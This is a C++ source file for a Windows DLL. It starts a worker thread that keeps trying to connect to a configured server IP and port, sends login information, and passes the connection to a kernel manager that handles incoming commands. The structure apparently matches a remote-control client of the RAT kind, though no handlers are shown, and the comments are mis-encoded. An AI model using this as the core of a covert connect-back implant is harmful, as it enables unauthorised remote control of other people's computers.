#include "Dll.h"
#include"Login.h"
#include"KernelManager.h"

char    __ServerIPAddress[MAX_PATH] = { 0 };
USHORT  __ServerConnectPort = 0;
HINSTANCE  __InstanceHandle = NULL;

BOOL  APIENTRY  DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case  DLL_PROCESS_ATTACH:
	{
		//����һ��exe(���ص�ǰDllģ��)
		__InstanceHandle = (HINSTANCE)hModule;
		break;
	}
	case  DLL_THREAD_ATTACH:
	case  DLL_THREAD_DETACH:
	case  DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
void  ClientRun(char* ServerIPAddres, USHORT  ServerConnectPort)
{
	memcpy(__ServerIPAddress, ServerIPAddres, strlen(ServerIPAddres));
	__ServerConnectPort = ServerConnectPort;

	//����һ�������߳�
	HANDLE  ThreadHandle = CreateThread(NULL, 0,
		(LPTHREAD_START_ROUTINE)WorkThreadProcedure,
		NULL, 0, NULL);

	//�ȴ������̵߳������˳�
	WaitForSingleObject(ThreadHandle, INFINITE);

	printf("Client Bye Bye!!!\r\n");
	if (ThreadHandle != NULL)
	{
		CloseHandle(ThreadHandle);
	}
	
}
DWORD WINAPI  WorkThreadProcedure(LPVOID ParameterData)
{
	_CIOCPClient  IOCPClient;
	BOOL  IsOk = FALSE;
	while (1)
	{
		if (IsOk == TRUE)
		{
			break;
		}
		DWORD  TickCount = GetTickCount();
		if (!IOCPClient.ConnectServer(__ServerIPAddress, __ServerConnectPort))
		{
			continue;
		}
		//�����������������
		//���͵�һ������
		SendLoginInformation(&IOCPClient, GetTickCount() - TickCount);
		//�����������ݵĻ���
		CKernelManager  KernelManager(&IOCPClient);

		do
		{
			IsOk = WaitForSingleObject(IOCPClient.m_EventHandle, 100);
			IsOk = IsOk - WAIT_OBJECT_0;
		} while (IsOk != 0);
		IsOk = TRUE;
	}
	return 0;
}

